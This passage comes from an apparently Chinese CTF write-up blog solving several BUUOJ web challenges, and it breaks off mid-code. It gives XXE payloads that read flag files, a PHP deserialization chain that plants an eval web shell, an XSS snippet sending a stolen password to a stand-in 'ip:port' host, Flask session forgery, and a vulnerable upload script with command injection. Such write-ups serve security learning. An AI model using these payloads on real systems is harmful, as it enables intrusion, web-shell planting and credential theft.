class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /render HTTP/1.1</span><br><span class="line">Host: b474211a-3cf4-4702-9d2c-745db3dc1502.node3.buuoj.cn</span><br><span class="line">Content-Length: 380</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://b474211a-3cf4-4702-9d2c-745db3dc1502.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7sKbBUdkFmeFXA7b</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://b474211a-3cf4-4702-9d2c-745db3dc1502.node3.buuoj.cn/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=17a129a5be511b-050b851bf333b5-4373266-144000-17a129a5be6691; OUTFOX_SEARCH_USER_ID_NCOO=828730801.2157147</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7sKbBUdkFmeFXA7b</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"svgfile"</span>; filename=<span class="string">"1.svg"</span></span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM <span class="string">"file:///proc/self/cwd/flag.txt"</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=<span class="string">"100"</span> width=<span class="string">"1000"</span>&gt;</span><br><span class="line">  &lt;text x=<span class="string">"10"</span> y=<span class="string">"20"</span>&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">------WebKitFormBoundary7sKbBUdkFmeFXA7b--</span><br></pre></td></tr></table></figure><h1 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($store, $key = <span class="string">'flysystem'</span>, $expire = null)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span> </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">            <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span><span class="params">($expire)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">"uploads/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;complete = <span class="string">'aaa'</span>.base64_encode(<span class="string">'&lt;?php @eval($_POST[a]); ?&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = <span class="keyword">array</span>( <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                                <span class="string">'prefix'</span> =&gt; <span class="string">'php://filter/write=convert.base64-decode/resource=uploads/shell.php'</span>,</span><br><span class="line">                                <span class="string">'serialize'</span> =&gt; <span class="string">'strval'</span>); <span class="comment">//strval加了相当于不加，只是为了用到serialize</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A));</span><br></pre></td></tr></table></figure><h1 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h1><h1 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h1><p><a href="https://github.com/gwht/2019GWCTF/tree/master/wp/web/mypassword" target="_blank" rel="noopener">https://github.com/gwht/2019GWCTF/tree/master/wp/web/mypassword</a>   </p><p>回到登录界面发现login.js中的记住密码功能会将读取cookie中的password。于是构造一个登录框并且引入login.js提交反馈等待bot点开获得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;incookieput <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;incookieput <span class="built_in">type</span>=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">"./js/login.js"</span>&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">var psw = docucookiement.getcookieElementsByName(<span class="string">"password"</span>)[0].value;</span><br><span class="line">docucookiement.locacookietion=<span class="string">"http://ip:port/?psw="</span>+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br></pre></td></tr></table></figure><h1 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf-16 2.xml&gt;1.xml</span><br></pre></td></tr></table></figure><h1 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h1><p>exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: 35328b36-f427-464f-b34f-e4463d613edd.node3.buuoj.cn</span><br><span class="line">Content-Length: 342</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36</span><br><span class="line">Content-type: application/xml</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://35328b36-f427-464f-b34f-e4463d613edd.node3.buuoj.cn</span><br><span class="line">Referer: http://35328b36-f427-464f-b34f-e4463d613edd.node3.buuoj.cn/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=17a129a5be511b-050b851bf333b5-4373266-144000-17a129a5be6691; OUTFOX_SEARCH_USER_ID_NCOO=828730801.2157147</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM <span class="string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso <span class="string">'</span></span><br><span class="line"><span class="string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="string">        &amp;#x25;eval;</span></span><br><span class="line"><span class="string">        &amp;#x25;error;</span></span><br><span class="line"><span class="string">    '</span>&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h1 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h1><p>在flask框架下可以用一个名为的local_file协议，使用方法和file://协议没什么区别，读一下/etc/passwd发现能用，确定框架flask，python题。读一下/proc/self/cmdline得到路径/app/app.py，读取获得源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/read')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'No Hack'</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">print</span> str(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'no response'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>:</span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>session伪造，对于伪随机数，如果seed是固定的，生成的随机数是可以预测的，也就是顺序固定的，所以只要知道seed的值即可。这里的seed使用的uuid.getnode()的值，该函数用于获取Mac地址并将其转换为整数。</p><p>那么就需要读取Mac地址local_file:///sys/class/net/eth0/address</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import random</span><br><span class="line">&gt;&gt;&gt; random.seed(0x0242ac10a85c)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(str(random.random()*233))</span><br><span class="line">196.83043201</span><br></pre></td></tr></table></figure><p>生成flask</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 flask_session_cookie_manager2.py encode -s 196.83043201 -t <span class="string">"&#123;'username': b'fuck'&#125;"</span></span><br><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.YM9qwA.T0VgPVp2FohrHS9Ew76U4tv9fpQ</span><br></pre></td></tr></table></figure><p>替换cookie，访问/flag，即可得flag</p><h1 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h1><p>register.php存在注册页面，注册一个账户登录</p><p>存在任意文件读取 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?page=php://filter/convert.base64-encode/resource=info</span><br></pre></td></tr></table></figure><p>parse_url可用///user.php?page=绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?page=php://filter/convert.base64-encode/resource=upllloadddd</span><br></pre></td></tr></table></figure><p>upllloadddd存在命令执行，上传的文件名可控。   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file锛�"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>.$filename.<span class="string">" | base64 -w 0"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span 